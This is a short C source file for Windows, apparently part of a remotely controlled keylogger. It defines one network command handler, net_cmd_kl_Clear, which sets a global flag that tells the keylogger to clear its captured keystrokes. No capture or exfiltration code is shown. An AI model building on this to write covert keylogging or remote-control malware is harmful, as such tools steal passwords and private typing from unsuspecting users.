#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"
#include "keylogger.h"

int net_cmd_kl_Clear(char* msg, int msgLen)
{
	keylogger_cmd = KEYLOGGER_CMD_CLEAR;
	
	return 1;
}